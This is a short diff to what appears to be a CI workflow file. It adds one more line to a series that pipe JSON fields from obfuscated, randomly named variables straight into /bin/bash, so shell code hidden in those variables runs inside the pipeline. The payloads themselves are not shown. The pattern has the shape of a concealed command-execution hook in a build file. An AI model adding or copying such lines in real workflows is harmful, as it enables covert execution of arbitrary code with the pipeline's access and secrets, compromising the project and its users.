@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$nwmo9519" | jq -r .nob04 | /bin/bash
           printf '%s' "$y443" | jq -r .rpue0280 | /bin/bash
           echo $ccds63889 | jq -r .e50074 | /bin/bash
+          echo $qpvot98374 | jq -r .s4 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
